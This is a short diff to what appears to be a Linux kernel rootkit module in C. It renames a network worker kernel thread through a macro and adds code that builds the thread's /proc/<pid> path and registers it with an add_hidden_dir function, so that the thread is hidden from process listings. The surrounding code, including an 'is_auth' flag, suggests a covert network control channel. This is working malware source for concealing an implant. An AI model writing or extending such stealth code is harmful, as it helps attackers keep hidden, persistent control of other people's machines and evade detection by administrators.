@@ -1,10 +1,9 @@
 #include <linux/delay.h>
-#include <linux/inet.h>
 #include <linux/kernel.h>
 #include <linux/kthread.h>
 #include <linux/net.h>
-#include <linux/socket.h>
 
+#include "hide.h"
 #include "network.h"
 
 static bool is_auth = false;
@@ -118,11 +117,16 @@ int start_network_worker(void) {
         return -EBUSY;
     }
 
-    network_worker_thread = kthread_run(network_worker, NULL, "netcom_thread");
+    network_worker_thread = kthread_run(network_worker, NULL, NETWORK_WORKER_THREAD_NAME);
     if (IS_ERR(network_worker_thread)) {
         ERR_MSG("start_network_worker: failed to start thread\n");
         return PTR_ERR(network_worker_thread);
     }
+
+    // Hide the thread
+    char path[32] = { 0 };
+    snprintf(path, sizeof(path), "/proc/%d", network_worker_thread->pid);
+    add_hidden_dir(path);
 
     return SUCCESS;
 }
